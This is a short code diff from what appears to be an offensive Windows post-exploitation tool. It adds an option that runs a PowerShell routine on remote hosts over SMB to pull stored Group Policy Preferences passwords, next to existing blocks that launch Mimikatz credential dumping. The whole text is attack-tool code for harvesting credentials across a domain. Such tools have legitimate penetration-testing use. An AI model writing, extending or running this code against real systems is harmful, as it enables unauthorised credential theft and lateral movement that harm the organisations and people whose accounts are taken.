@@ -187,6 +187,10 @@ def connect(host):
                 powah_command = PowerShell(settings.args.server, local_ip)
                 EXECUTOR(powah_command.mimikatz(), host, domain, True, smb, settings.args.execm)
 
+            if settings.args.gpp_passwords:
+                powah_command = PowerShell(settings.args.server, local_ip)
+                EXECUTOR(powah_command.gpp_passwords(), host, domain, True, smb, settings.args.execm)      
+
             if settings.args.mimikatz_cmd:
                 powah_command = PowerShell(settings.args.server, local_ip)
                 EXECUTOR(powah_command.mimikatz(settings.args.mimikatz_cmd), host, domain, True, smb, settings.args.execm)
